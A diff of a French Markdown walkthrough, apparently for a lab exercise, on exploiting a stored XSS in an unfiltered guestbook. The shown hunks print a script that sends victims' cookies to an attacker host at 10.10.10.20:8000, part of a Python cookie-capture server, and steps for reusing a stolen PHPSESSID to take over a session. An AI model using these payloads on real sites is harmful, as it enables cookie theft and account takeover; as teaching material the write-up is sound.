@@ -21,9 +21,9 @@ Le formulaire du livre d’or **ne filtre pas les entrées**, permettant d’inj
 🔹 **Script XSS à injecter dans un commentaire** :
 ```html
 <script>
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://10.10.10.20:8000/?cookie=' + document.cookie, true);
-xhr.send();
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://10.10.10.20:8000/?cookie=' + document.cookie, true);
+    xhr.send();
 </script>
 ```
 
@@ -35,8 +35,7 @@ xhr.send();
 L’attaquant met en place un **serveur d’écoute** pour récupérer les cookies volés.
 
 🔹 **Script Python sur Kali** :
-```python
-  GNU nano 8.3                                                                  capture/capture_server.py                                                                           
+```python {filename="capture_server.py"}                                                                
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import urllib.parse
 
@@ -100,6 +99,7 @@ driver.quit()
 ```bash
 cat stolen_cookies.txt
 ```
+
 ✅ **Utilisation du cookie volé pour usurper la session du garde** :
 - Ouvrir les outils développeur (`F12`) > **Application** > **Cookies**.
 - Modifier `PHPSESSID` avec la valeur capturée.
